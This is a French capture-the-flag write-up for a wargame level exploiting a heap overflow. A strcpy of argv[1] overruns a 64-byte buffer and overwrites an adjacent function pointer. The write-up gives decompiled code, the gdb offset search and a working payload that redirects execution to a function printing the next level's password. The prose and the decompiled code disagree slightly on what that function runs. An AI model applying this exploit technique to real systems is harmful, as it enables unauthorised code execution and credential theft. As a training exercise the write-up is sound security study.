# level6 : overflow heap

    void n(void)
    {
        system("/bin/cat /home/user/level7/.pass");
        return;
    }

    void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
    {
        puts("Nope");
        return;
    }

    void main(undefined4 param_1,int param_2)
    {
        char *__dest;
        undefined4 *puVar1;
        
        __dest = malloc(0x40);
        puVar1 = malloc(4);
        *puVar1 = m;
        strcpy(__dest,*(char **)(param_2 + 4));
        (*(code *)*puVar1)();
        return;
    }


`m()` et `n()` sont deux fonctions jamais appelées normalement (visibles dans `info function`) : `m()` fait juste un `puts`, `n()` fait `system("/bin/sh")`.

`malloc` place ses blocs les uns après les autres, déborder `__dest` (64 octets) écrase directement `puVar1` le pointeur de fonction juste après sur le heap. On peut donc rediriger `(*(code *)*puVar1)();` où on veut, en écrasant ce pointeur via l'argument.

**Trouver l'offset**

L'input ici passe par `argv[1]`, pas par `stdin` donc pas de `gets`/pattern dans gdb, on teste directement avec un pattern alphabétique en argument :

    gdb ./level6
    (gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'

    Program received signal SIGSEGV, Segmentation fault.
    0x53535353 in ?? ()

Le crash a lieu sur `0x53535353`, en ascii = ("SSSS") donc le pointeur de fonction a été écrasé par le morceau du pattern qui contient `S`. En comptant sa position dans la séquence offset = **72**.

**Trouver l'adresse de `n()`**

    (gdb) p &n
    $1 = (<text variable, no debug info> *) 0x8048454 <n>

**payload**

    ./level6 "$(printf 'B%.0s' {1..72}; printf '\x54\x84\x04\x08')"

